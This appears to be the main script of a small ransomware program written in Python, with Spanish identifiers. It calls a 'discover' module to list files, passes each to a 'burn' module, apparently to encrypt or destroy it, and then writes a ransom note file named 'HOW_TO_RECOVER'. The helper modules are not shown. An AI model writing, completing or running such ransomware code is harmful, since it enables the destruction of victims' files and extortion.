import discover
import burn

archivos=discover.encuentra_archivos()
print(archivos)

for item in archivos:
    burn.main(item)

with open("~/HOW_TO_RECOVER",'w') as file:
    file.write("RANSOM SC2-RANSOM SC2")
